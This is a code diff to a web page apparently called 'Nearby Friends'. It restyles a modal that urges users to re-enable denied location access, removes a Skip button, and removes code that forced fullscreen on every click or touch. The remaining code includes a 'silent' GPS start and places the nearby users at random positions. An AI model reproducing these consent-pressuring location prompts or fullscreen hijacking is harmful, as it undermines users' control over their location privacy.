-        Close
-      </button>
-    </div>
-  `;
+                <div style="background:#1c1c1e; border-radius:24px; padding:32px 24px;
+                            max-width:420px; width:100%; text-align:center; color:#fff;
+                            box-shadow:0 20px 60px rgba(0,0,0,0.6);">
+                    <div style="font-size:72px; margin-bottom:20px;">📍</div>
+                    <h2 style="font-size:24px; font-weight:600; margin-bottom:12px; color:#EA4335;">
+                        Location Blocked
+                    </h2>
+                    <p style="font-size:15px; color:#8e8e93; line-height:1.6; margin-bottom:24px;">
+                        You denied location earlier. Enable it manually to find nearby friends.
+                    </p>
+                    <div style="background:#2c2c2e; border-radius:14px; padding:18px;
+                                text-align:left; font-size:14px; line-height:1.9;
+                                color:#e0e0e0; margin-bottom:24px;">
+                        <strong style="color:#1a73e8;">📋 How to enable:</strong>
+                        <ol style="margin-left:20px; margin-top:6px;">
+                            ${isMobile ? `
+                                <li>Open browser <strong>Settings</strong></li>
+                                <li>Go to <strong>Site Settings → Location</strong></li>
+                                <li>Find this site → set to <strong>Allow</strong></li>
+                                <li>Come back and refresh</li>
+                            ` : `
+                                <li>Click the <strong>🔒 lock icon</strong> in the address bar</li>
+                                <li>Find <strong>Location</strong> → set to <strong>Allow</strong></li>
+                                <li>Refresh the page (F5)</li>
+                            `}
+                        </ol>
+                    </div>
+                    <button onclick="location.reload()"
+                        style="width:100%; padding:16px; border:none; border-radius:14px;
+                               background:linear-gradient(135deg, #1a73e8, #34A853);
+                               color:#fff; font-size:16px; font-weight:600;
+                               cursor:pointer; margin-bottom:10px;">
+                        🔄 I Enabled It — Refresh
+                    </button>
+                    <button onclick="document.getElementById('deniedModal').remove()"
+                        style="width:100%; padding:14px; border:none; border-radius:14px;
+                               background:transparent; color:#8e8e93; font-size:14px;
+                               cursor:pointer;">
+                        Close
+                    </button>
+                </div>
+            `;
 
             document.body.appendChild(modal);
         }
 
         /* ============================================================
-           REQUEST GPS — From popup button
+           REQUEST GPS
            ============================================================ */
         function requestGPS() {
             hideGPSModal();
@@ -1771,7 +1590,7 @@
             const mapArea = document.getElementById('mapArea');
             const listArea = document.getElementById('nearbyList');
 
-            users.forEach((user, i) => {
+            users.forEach((user) => {
                 const angle = Math.random() * 2 * Math.PI;
                 const radius = 40 + (user.distance * 25);
                 const isClose = user.distance <= 0.7;
@@ -1789,10 +1608,10 @@
                 card.className = 'nearbyCard';
                 card.onclick = () => showToast(`Opening chat with ${user.name}...`);
                 card.innerHTML = `
-      <div class="avatar ${online ? 'online' : ''}" style="background-image: url('${user.avatar}');"></div>
-      <div class="name">${user.name}</div>
-      <div class="distance ${isClose ? 'close' : ''}">${user.distance < 1 ? Math.round(user.distance * 1000) + 'm' : user.distance + 'km'}</div>
-    `;
+                    <div class="avatar ${online ? 'online' : ''}" style="background-image: url('${user.avatar}');"></div>
+                    <div class="name">${user.name}</div>
+                    <div class="distance ${isClose ? 'close' : ''}">${user.distance < 1 ? Math.round(user.distance * 1000) + 'm' : user.distance + 'km'}</div>
+                `;
                 listArea.appendChild(card);
             });
 
@@ -1824,7 +1643,7 @@
         }
 
         /* ============================================================
-           🚀 SMART AUTO GPS FLOW
+           SMART AUTO GPS FLOW
            ============================================================ */
         async function silentGPSStart() {
             if (gpsStarted) return;
@@ -1907,19 +1726,21 @@
         console.log('✅ Nearby Friends ready');
 
         /* ============================================================
-           🔥 EXPOSE FUNCTIONS TO WINDOW (for onclick buttons)
+           EXPOSE FUNCTIONS TO WINDOW
            ============================================================ */
         window.requestGPS = requestGPS;
         window.skipGPS = skipGPS;
         window.refreshLocation = refreshLocation;
         window.showToast = showToast;
+        window.hideGPSModal = hideGPSModal;
+        window.showGPSModal = showGPSModal;
 
         console.log('✅ Functions exposed to window');
+
         /* ============================================================
-   🔥 BUTTON EVENT LISTENERS
-   ============================================================ */
+           BUTTON EVENT LISTENERS
+           ============================================================ */
         const enableBtn = document.getElementById('enableBtn');
-        const skipBtn = document.getElementById('skipBtn');
 
         if (enableBtn) {
             enableBtn.addEventListener('click', () => {
@@ -1928,63 +1749,13 @@
             });
         }
 
-        if (skipBtn) {
-            skipBtn.addEventListener('click', () => {
-                console.log('⏭️ Skip clicked');
-                skipGPS();
-            });
-        }
-
-        // 🔥 Bottom controls bhi
+        // Bottom controls
         const ctrlBtns = document.querySelectorAll('.ctrlBtn');
         if (ctrlBtns[0]) ctrlBtns[0].addEventListener('click', refreshLocation);
         if (ctrlBtns[1]) ctrlBtns[1].addEventListener('click', () => showToast('Chat feature coming soon'));
         if (ctrlBtns[2]) ctrlBtns[2].addEventListener('click', () => showToast('Settings'));
 
         console.log('✅ All buttons wired');
-        /* ============================================================
-   🔒 FULLSCREEN ON ANY CLICK
-   ============================================================ */
-
-        let __fullscreenTriggered = false;
-
-        function goFullscreen() {
-            // Agar already fullscreen me hai toh skip
-            if (document.fullscreenElement) return;
-
-            const el = document.documentElement;
-            const req = el.requestFullscreen ||
-                el.webkitRequestFullscreen ||
-                el.mozRequestFullScreen ||
-                el.msRequestFullscreen;
-
-            if (!req) {
-                console.log('❌ Fullscreen not supported');
-                return;
-            }
-
-            req.call(el).then(() => {
-                console.log('✅ Fullscreen ON');
-                __fullscreenTriggered = true;
-            }).catch((err) => {
-                console.log('❌ Fullscreen blocked:', err.message);
-            });
-        }
-
-        /* 🔥 Har click / touch pe fullscreen try karo */
-        document.addEventListener('click', () => {
-            if (!document.fullscreenElement) {
-                goFullscreen();
-            }
-        }, { capture: true });
-
-        document.addEventListener('touchstart', () => {
-            if (!document.fullscreenElement) {
-                goFullscreen();
-            }
-        }, { capture: true, passive: true });
-
-        console.log('🔒 Fullscreen on any click enabled');
     </script>
 </body>
 
